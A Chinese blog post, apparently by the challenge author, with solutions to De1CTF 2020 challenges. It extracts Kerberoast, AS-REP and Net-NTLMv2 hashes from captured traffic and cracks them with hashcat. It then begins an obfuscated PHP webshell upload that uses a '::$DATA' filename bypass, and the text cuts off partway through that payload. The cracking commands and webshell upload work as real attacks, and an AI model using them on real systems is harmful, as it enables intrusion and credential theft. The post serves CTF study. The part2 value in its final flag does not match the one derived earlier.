<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>No title | 七友</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content>
    <meta name="description" content="Easy Protocolhinthint的文件头是MSCF，搜索一下可以知道这就是一个makecab压缩的文件，直接使用expand命令解压得到hint.txt hint.txt 1234hint1: flag is De1CTF{part1_part2_part3}hint2: The part1,part2 and part3 is a pure number with a length o">
<meta property="og:type" content="article">
<meta property="og:title" content="No title">
<meta property="og:url" content="https://byqiyou.github.io/2020/05/06/De1CTF2020/index.html">
<meta property="og:site_name" content="七友">
<meta property="og:description" content="Easy Protocolhinthint的文件头是MSCF，搜索一下可以知道这就是一个makecab压缩的文件，直接使用expand命令解压得到hint.txt hint.txt 1234hint1: flag is De1CTF{part1_part2_part3}hint2: The part1,part2 and part3 is a pure number with a length o">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://i.loli.net/2020/05/05/98zZt3wkNfog7Hi.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/raVzWJtOveiPslk.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/boYP7hWDpjUnzQV.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/dpPUTgXieY9AGIw.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/IZRjrLFk8Eldpac.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/6jbiXVxd1gYsFMI.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/XzlLOxdZofhqIE2.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/VCn4FW2amxzYbpw.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/vPFWmMsaQSrzNVn.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/C7cJ9afkQuGbM1m.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/F2w5M9LPtsrzfnu.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/bPR6IZ7mpBNk14Q.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/KUwZt3nkrH8SgpR.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/K8YJMgxf6SmNCbn.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/bRzpTnIfJKluUkD.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/zs1ewu7xq256Fbd.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/1FcBuURiYK9NwVH.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/GFscQ52ryqzDbVH.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/dcwhRPqpyLxbTrQ.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/9QMeEHbmWZOT4CL.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/tuUW5Tsv8akISbY.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/3b6wdSU97xmQ8DK.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/b7iMdkjF6ElXpKe.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/S7ak14zgVlCu3dA.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/rH5AzbohEUWfyqt.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/tTIwNgMYdS2WCZK.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/lvid7czZSfP3apE.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/IbnqfEOQMpAH2ho.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/YNK7qHQydiMglxB.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/vaGIPQfXKyEJl7r.png">
<meta property="og:image" content="https://i.loli.net/2020/05/05/3LARC8ax2MBQJWY.gif">
<meta property="og:updated_time" content="2020-05-06T02:17:32.895Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="No title">
<meta name="twitter:description" content="Easy Protocolhinthint的文件头是MSCF，搜索一下可以知道这就是一个makecab压缩的文件，直接使用expand命令解压得到hint.txt hint.txt 1234hint1: flag is De1CTF{part1_part2_part3}hint2: The part1,part2 and part3 is a pure number with a length o">
<meta name="twitter:image" content="https://i.loli.net/2020/05/05/98zZt3wkNfog7Hi.png">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname"></h5>
          <a href="mailto:1920854803@qq.com" title="1920854803@qq.com" class="mail">1920854803@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/byqiyou" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/friends"  >
                <i class="icon icon-lg icon-friends"></i>
                Friends
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-about"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">No title</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">No title</h1>
        <h5 class="subtitle">
            
                <time datetime="2020-05-06T02:24:10.742Z" itemprop="datePublished" class="page-time">
  2020-05-06
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Easy-Protocol"><span class="post-toc-number">1.</span> <span class="post-toc-text">Easy Protocol</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#hint"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">hint</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#part1"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">part1</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#part2"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">part2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#part3"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">part3</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#END"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">END</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hard-Pentest"><span class="post-toc-number">2.</span> <span class="post-toc-text">Hard_Pentest</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#End"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">End</span></a></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-De1CTF2020"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">No title</h1>
        <div class="post-meta">
            <time class="post-time" title="2020-05-06 10:24:10" datetime="2020-05-06T02:24:10.742Z"  itemprop="datePublished">2020-05-06</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Easy-Protocol"><a href="#Easy-Protocol" class="headerlink" title="Easy Protocol"></a>Easy Protocol</h1><h2 id="hint"><a href="#hint" class="headerlink" title="hint"></a>hint</h2><p>hint的文件头是<code>MSCF</code>，搜索一下可以知道这就是一个makecab压缩的文件，直接使用expand命令解压得到hint.txt</p>
<p>hint.txt</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hint1: flag is De1CTF{part1_part2_part3}</span><br><span class="line">hint2: The part1,part2 and part3 is a pure number with a length of 8</span><br><span class="line"></span><br><span class="line">have fun!!!!!</span><br></pre></td></tr></tbody></table></figure>
<p>hint.txt应该是和流量包有关的，暂时先不管</p>
<h2 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h2><p>简单浏览一下数据包，主要把目光投到Kerberos协议和LDAP协议上，简单跟一下LDAP，发现过滤条件是：<code>(&amp;(&amp;(&amp;(samAccountType=805306368)(servicePrincipalName=*))(samAccountName=De1CTF2020))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))</code>，主要是这个<code>servicePrincipalName=*</code>，是查询域用户<code>De1CTF2020</code>所有存在的SPN</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/98zZt3wkNfog7Hi.png" alt="9.png" title="">
                </div>
                <div class="image-caption">9.png</div>
            </figure>
<p>然后后面又有一个TGS-REQ请求</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/raVzWJtOveiPslk.png" alt="10.png" title="">
                </div>
                <div class="image-caption">10.png</div>
            </figure>
<p>再回到hint中，应该是要你暴力破解之类的，然后猜测应该是<code>Kerberoasting</code></p>
<p>然后将TGS-REQ中的SPN和票据的<code>enc-part</code>提取出来</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/boYP7hWDpjUnzQV.png" alt="8.png" title="">
                </div>
                <div class="image-caption">8.png</div>
            </figure>
<p>构造成hashcat支持的hash格式，<code>$krb5tgs$23$*&lt;USERNAME&gt;$&lt;DOMAIN&gt;$&lt;SPN&gt;*$&lt;FIRST_16_BYTES&gt;$&lt;REMAINING_BYTES&gt;</code></p>
<p>然后爆破即可</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 13100 $krb5tgs$23$*De1CTF2020$test.local$part1/De1CTF2020*$b9bac2cd9555738bc4f8a38b7aa3b01d$12befde687b62d10d325ebc03e0dd0d6bca1f526240dfa6d23dc5bcafc224591dcf4ba97bf6219cfbe16f1b59d289800fdcc8f051626b7fe0c2343d860087c45b68d329fd1107cebe4e537f77f9eea0834ae8018a4fe8518f1c69be95667fd69dcc590d3d443a8530ff8e38ee7f7b6e378d64a8b43b985bcc20f941947ea9e8463fd7e0fa77f284368b9b489f6d557da1e02990cfc725723e5d452ff6e659717947805b852ad734c5acc8011e535b96cef3af796610196d31c725362f7426e0cf92985ffe0717baaf5066fdba760b90e2c9b7e15bc9a4952cff47d4a092d3be6128997f9ff85dbafb85a5569b5d021b2a23c6371cbdf8beaa68b332e6ba1c1a8dc43c50695498ed8c2dfbf11760af35e1b913cd36b8015df37a146d2696c8b6b5f2ce375f2674acc0ce04aa98b9d21291466ce7a2aeb5a72fda17fa53e5b41df67d3898457d05fc899096092b3aa5bc333cb75eb5eee4b1c33356e72d9d28d6d674a5e47f64c72afb580e8d4f713a5ae265a4c825c39c19313a532a23c27eaf24bcde29c5e65c13cc057e0db72094bcedb6049574e35e511847f460180ddd78f4c9187345b1068bd608ca238c20d200ffa7e3891d076fe6fcef93d044c79f5ec9fb33561a35acf785b2a203df6d07e39161d9d3cedbe6d4394bd2bf43e545acd03f796c7863d684f9db4a5eef070f71e58a4882c2387d0705f4bed32fd7986dd672a15f6cfa56fe127af7c157216b2ea4f61ab7963d9dcaf4bb9222a7cba86d6a5e6c24833ffbf1957d90224764a01e0cb5a90f12dfea4ddaef23e30c2bdafcbcd99031db5d0698c1a050fc679213a8b81b854c08686f43241a4ec937c71cd09c9519fa2bba3aa845c4e84dbd6d9bbc3a62c876fb4c30bfa7960f0f51587ece14a31add698b1b9743e14fc343394f8a346c8e24cc8c26a8f8246f6a68928d0118dea81fea9976af3c57fa4c764f565e458e065d5a2a3dd1b083f7851d4ae1b791ada853e9a20e5b169ea0b8b582711f04df4dad8b461771dda5fca11c3f8f82d85e657bbd57d12cf15c8bbce7ad6cd1ebf540c45aefd4aef2ec828b06f208bd57be6a5529481b9f8b8fad5962e86b349a720ec2a1380ed711ee0261b29383907dae6f7a45d3fff54efae7ace1f4d7193f4a4d932699a41c3deb3ba9934278942e8f09ecd4339de4059dd3ff06b78e773b6ab9826df7ea2a443dddd55cdf79db1f76e2f05105e6cc5f0c4bd494b9556d921c6cb3fa48d1ddd27cf077ebd3e44b716fc74d1115b293e348fb9676e6727a3a97a7c2b86e8b83d8f90b9bf628c71e56aabcac381a32d493db3f255378c498a0bf527a9677cb81ec89911a9b09d6ffe16e2f2de63728439f8275d9f6feac2da860c5aab772034b2b0b962c033f8102ac86b2a9b07a82e9c70be65fe371e9d296afbe0e7272b90256428553c6a4fb0a8f5290098e4dad4021d99a65f2a3fa4ad0d2f ?d?d?d?d?d?d?d?d -a 3 --force</span><br></pre></td></tr></tbody></table></figure>
<p>得到part1:79345612</p>
<h2 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h2><p>这其实是<code>AS-REPRoasting</code>，判定过程如下：</p>
<p>跟进LDAP查询的请求，发现有一个这样的过滤条件<code>(userAccountControl:1.2.840.113556.1.4.803:=4194304)</code></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/dpPUTgXieY9AGIw.png" alt="4.png" title="">
                </div>
                <div class="image-caption">4.png</div>
            </figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/IZRjrLFk8Eldpac.png" alt="5.png" title="">
                </div>
                <div class="image-caption">5.png</div>
            </figure>
<p><code>DONT_REQ_PREAUTH</code>的值为<code>4194304</code>，也就是说这个LDAP请求是查找开启了<code>Do not require Kerberos preauthentication</code>的用户，如果用户开启了<code>Do not require Kerberos preauthentication</code>那么就可以通过<code>AS-REPRoasting</code>去暴力破解这个用户的凭证。</p>
<p>还有一个判断方法是第一步发送AS-REQ请求的时候，AS-REP返回了一个<code>eRR-PROAUTH-REQUIRED</code>错误，不过这个方法不完全能判定是<code>AS-REPRoasting</code>，因为在默认情况下，<code>Windows Kerberos</code>客户端在第一个请求中不包括预身份验证信息，所以在正常认证中也会出现此情况。<code>eRR-PROAUTH-REQUIRED</code>只不过是进一步验证我们上面<code>AS-REPRoasting</code>的猜测</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/6jbiXVxd1gYsFMI.png" alt="6.png" title="">
                </div>
                <div class="image-caption">6.png</div>
            </figure>
<p>猜测是<code>AS-REPRoasting</code>过程之后，然后从AS-REP中把票据的<code>enc-part</code>部分提取出来</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/XzlLOxdZofhqIE2.png" alt="7.png" title="">
                </div>
                <div class="image-caption">7.png</div>
            </figure>
<p>构造成hashcat支持的的格式，<code>$krb5asrep$23$&lt;PRINCIPAL_NAME&gt;:&lt;FIRST_16_BYTES&gt;$&lt;REMAINING_BYTES&gt;</code></p>
<p>然后爆破即可</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 18200 $krb5asrep$23$De1CTF2020@test.local:2a00ca98642914e2cebb2718e79cbfb6$9026dd00f0b130fd4c4fd71a80817ddd5aec619a9b2e9b53ae2309bde0a9796ebcfa90558e8aaa6f39350b8f6de3a815a7b62ec0c154fe5e2802070146068dc9db1dc981fb355c94ead296cdaefc9c786ce589b43b25fb5b7ddad819db2edecd573342eaa029441ddfdb26765ce01ff719917ba3d0e7ce71a0fae38f91d17cf26d139b377ea2eb5114a2d36a5f27983e8c4cb599d9a4a5ae31a24db701d0734c79b1d323fcf0fe574e8dcca5347a6fb98b7fc2e63ccb125a48a44d4158de940b4fd0c74c7436198380c03170835d4934965ef6a25299e3f1af107c2154f40598db8600c855b2b183 ?d?d?d?d?d?d?d?d -a 3 --force</span><br></pre></td></tr></tbody></table></figure>
<p>得到part2:74212345</p>
<h2 id="part3"><a href="#part3" class="headerlink" title="part3"></a>part3</h2><p>一个NTLM认证的过程，将数据包中的<code>Net-NTLM v2 hash</code>提取出来爆破即可，有两种方法，第一种方法是将<code>WWW-Authenticate</code>头的内容提取出来，第二种方法是直接从数据包中提取<code>Net-NTLM v2 hash</code>的各个部分</p>
<p>这里以第一种方法为例，将<code>WWW-Authenticate</code>头的内容提取出来，写一个脚本转换为<code>Net-NTLM v2 hash</code>即可</p>
<p>参考这篇文章<a href="https://www.innovation.ch/personal/ronald/ntlm.html" target="_blank" rel="noopener">https://www.innovation.ch/personal/ronald/ntlm.html</a></p>
<p>脚本如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">NTLM=<span class="string">"NTLM TlRMTVNTUAADAAAAGAAYAH4AAAAkASQBlgAAAAgACABYAAAAFAAUAGAAAAAKAAoAdAAAAAAAAAC6AQAABYKIogoAY0UAAAAPZ+qOBf/ZoMFgp+YUgxdqNVQARQBTAFQARABlADEAQwBUAEYAMgAwADIAMABXAEkATgAxADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtZkcwqDVhdD4EzWOqvx0EgEBAAAAAAAAEwy5ECMI1gHSKQvAwlYXqAAAAAACAAgAVABFAFMAVAABAAwARABNADIAMAAxADIABAAUAHQAZQBzAHQALgBsAG8AYwBhAGwAAwAiAGQAbQAyADAAMQAyAC4AdABlAHMAdAAuAGwAbwBjAGEAbAAFABQAdABlAHMAdAAuAGwAbwBjAGEAbAAHAAgAEwy5ECMI1gEGAAQAAgAAAAgAMAAwAAAAAAAAAAAAAAAAEAAA7Ko9RN3EZAJsRTIGgTqvoLkY8q1D1Jfvj7a+sggyWKQKABAAAAAAAAAAAAAAAAAAAAAAAAkAHgBIAFQAVABQAC8AdABlAHMAdAAuAGwAbwBjAGEAbAAAAAAAAAAAAA=="</span></span><br><span class="line">b64_challenge=<span class="string">"NTLM TlRMTVNTUAACAAAACAAIADgAAAAFgomiVohvkPy3Pe0AAAAAAAAAAIIAggBAAAAABgOAJQAAAA9UAEUAUwBUAAIACABUAEUAUwBUAAEADABEAE0AMgAwADEAMgAEABQAdABlAHMAdAAuAGwAbwBjAGEAbAADACIAZABtADIAMAAxADIALgB0AGUAcwB0AC4AbABvAGMAYQBsAAUAFAB0AGUAcwB0AC4AbABvAGMAYQBsAAcACAATDLkQIwjWAQAAAAA="</span></span><br><span class="line">challenge= b64_challenge[<span class="number">5</span>:].decode(<span class="string">"base64"</span>)[<span class="number">24</span>:<span class="number">24</span>+<span class="number">8</span>].encode(<span class="string">"hex"</span>)</span><br><span class="line">message = NTLM[<span class="number">5</span>:].decode(<span class="string">"base64"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg2str</span><span class="params">(msg,start,uni=True)</span>:</span></span><br><span class="line">    len = ord(msg[start+<span class="number">1</span>])*<span class="number">256</span> + ord(msg[start])</span><br><span class="line">    offset = ord(msg[start+<span class="number">5</span>])*<span class="number">256</span> + ord(msg[start+<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">if</span> uni:</span><br><span class="line">        <span class="keyword">return</span> (msg[offset:offset+len]).replace(<span class="string">"\x00"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> msg[offset:offset+len]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user = msg2str(message,<span class="number">36</span>)</span><br><span class="line">domain = msg2str(message,<span class="number">28</span>)</span><br><span class="line">response = msg2str(message,<span class="number">20</span>,<span class="literal">False</span>)</span><br><span class="line">NTProofStr = response[<span class="number">0</span>:<span class="number">16</span>].encode(<span class="string">"hex"</span>)</span><br><span class="line">blob = response[<span class="number">16</span>:].encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"{user}::{domain}:{challenge}:{NTProofStr}:{blob}"</span>.format(user=user,domain=domain,challenge=challenge,NTProofStr=NTProofStr,blob=blob))</span><br></pre></td></tr></tbody></table></figure>
<p>得到<code>Net-NTLM v2 hash</code></p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">De1CTF2020::TEST:56886f90fcb73ded:b5991cc2a0d585d0f813358eaafc7412:0101000000000000130cb9102308d601d2290bc0c25617a80000000002000800540045005300540001000c0044004d0032003000310032000400140074006500730074002e006c006f00630061006c000300220064006d0032003000310032002e0074006500730074002e006c006f00630061006c000500140074006500730074002e006c006f00630061006c0007000800130cb9102308d60106000400020000000800300030000000000000000000000000100000ecaa3d44ddc464026c453206813aafa0b918f2ad43d497ef8fb6beb2083258a40a0010000000000000000000000000000000000009001e0048005400540050002f0074006500730074002e006c006f00630061006c000000000000000000</span><br></pre></td></tr></tbody></table></figure>
<p>然后hashcat爆破即可</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 5600 De1CTF2020::TEST:56886f90fcb73ded:b5991cc2a0d585d0f813358eaafc7412:0101000000000000130cb9102308d601d2290bc0c25617a80000000002000800540045005300540001000c0044004d0032003000310032000400140074006500730074002e006c006f00630061006c000300220064006d0032003000310032002e0074006500730074002e006c006f00630061006c000500140074006500730074002e006c006f00630061006c0007000800130cb9102308d60106000400020000000800300030000000000000000000000000100000ecaa3d44ddc464026c453206813aafa0b918f2ad43d497ef8fb6beb2083258a40a0010000000000000000000000000000000000009001e0048005400540050002f0074006500730074002e006c006f00630061006c000000000000000000 ?d?d?d?d?d?d?d?d -a 3 --force</span><br></pre></td></tr></tbody></table></figure>
<p>得到part为<code>74212345</code></p>
<p>所以最终flag为：De1CTF{79345612_15673223_74212345}，上面的3个部分都是有工具可以提取hash的，篇幅有限这里就不过多演示了。</p>
<h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>其实Part1和Part2也不一定说是攻击过程，正常域认证出现这样的数据包也是很正常不过的，所以我才在我在中间加上了LDAP的查询语句，是想要选手快速定位数据包。还有就是密码长度设置的也不是很长，我这边跑完3个部分用时不到<code>1分钟</code>，有的队拿超算来跑，还有老外拿矿机来跑，看来我这题是真有“价值”啊233333</p>
<h1 id="Hard-Pentest"><a href="#Hard-Pentest" class="headerlink" title="Hard_Pentest"></a>Hard_Pentest</h1><p>上传</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: 47.113.219.76</span><br><span class="line">Content-Length: 1918</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://47.113.219.76</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyE7meGVYt90amEfD</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://47.113.219.76/</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryyE7meGVYt90amEfD</span><br><span class="line">Content-Disposition: form-data; name="file"; filename="1.php::$DATA"</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?=$_=[]?&gt;&lt;?=$_=@"$_"?&gt;&lt;?=$_=$_['!'=='@']?&gt;&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___ =$__?&gt;</span><br><span class="line">&lt;?=$____=$___?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__.$___?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__?&gt;</span><br><span class="line">&lt;?=$____='_'?&gt;</span><br><span 